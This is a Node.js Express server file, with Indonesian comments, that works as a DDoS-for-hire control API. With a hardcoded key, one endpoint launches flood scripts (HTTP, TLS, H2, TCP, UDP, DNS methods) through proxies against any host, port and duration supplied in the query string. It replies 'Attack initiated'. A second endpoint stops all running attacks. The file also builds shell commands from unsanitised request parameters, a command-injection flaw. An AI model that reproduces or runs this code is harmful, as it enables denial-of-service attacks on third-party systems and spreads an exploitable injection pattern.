const express = require('express');
const { spawn } = require('child_process');
const app = express();
const port = 2216;

const methods = {
    blast: 'blast.js',
    tls: 'tls.js',
    chap: 'chap.js',
    cibi: 'cibi.js',
    ciko: 'ciko.js',
    rapid: 'rapid.js',
    fire: 'fire.js',
    http: 'http.js',
    h2: 'h2.js',
    zinx: 'zinx.js',
    glory: 'glory.js',
   'tcp-gbps': 'tcp.js',
   'udp-gbps': 'udp.js',
   'dns': 'dns.js',
};

// Daftar proses yang berjalan
const activeProcesses = new Map();

const generateCommand = (method, host, port, time) => {
    switch (method) {
        case 'blast':
            return `cd /root/api/ && node blast.js ${host} ${time} 32 5 proxy.txt`;
        case 'zinx':
            return `cd /root/api/ && node zinx.js ${host} ${time} 32 5 proxy.txt`;
        case 'chap':
            return `cd /root/api/ && node chap.js ${host} ${time} 10 64 proxy.txt`;
        case 'cibi':
            return `cd /root/api/ && node cibi.js ${host} ${time} 32 5 proxy.txt`;
        case 'ciko':
            return `cd /root/api/ && node ciko.js ${host} ${time} 64 10 proxy.txt`;
        case 'rapid':
            return `cd /root/api/ && node rapid.js ${host} ${time} 32 5 proxy.txt`;
        case 'fire':
            return `cd /root/api/ && node fire.js ${host} ${time} 32 5 proxy.txt`;
        case 'http':
            return `cd /root/api/ && node http.js ${host} ${time} 32 5 proxy.txt`;
        case 'h2':
            return `cd /root/api/ && node h2.js ${host} ${time} 32 5 proxy.txt`;
        case 'glory':
            return `cd /root/api/ && node glory.js ${host} ${time} 32 5 proxy.txt`;
        case 'tls':
            return `cd /root/api/ && node tls.js ${host} ${time} 32 5 proxy.txt`;
        case 'tcp-gbps':
            return `cd /root/api/ && node tcp.js ${host} ${port} ${time}`;   
        case 'dns':
            return `cd /root/api/ && node dns.js ${host} 22 ${time}`;
        case 'udp-gbps':
            return `cd /root/api/ && node udp.js ${host} ${port} ${time}`;
        default:
            return `cd /root/api/ && node ${methods[method]} ${host} ${port} ${time}`;
    }
};

app.get('/api/Kurlung', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (key !== 'Kurlung') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!methods[method]) {
        return res.status(400).json({ error: 'Unknown method' });
    }

    res.json({
        status: 'Attack initiated',
        host: host,
        port: port,
        time: time,
        method: method,
    });

    const command = generateCommand(method, host, port, time);
    const process = spawn('bash', ['-c', command], { detached: true });

    process.stdout.on('data', (data) => {
        console.log(`Stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`Stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`Process exited with code ${code}`);
    });

    // Simpan proses yang sedang berjalan
    activeProcesses.set(process.pid, process);
});

app.get('/api/Renzuis', (req, res) => {
    const key = req.query.key;

    if (key !== 'Renzuis') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    activeProcesses.forEach((process, pid) => {
        process.kill();
        activeProcesses.delete(pid);
    });

    res.json({ status: 'All attacks stopped.' });
});

app.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
});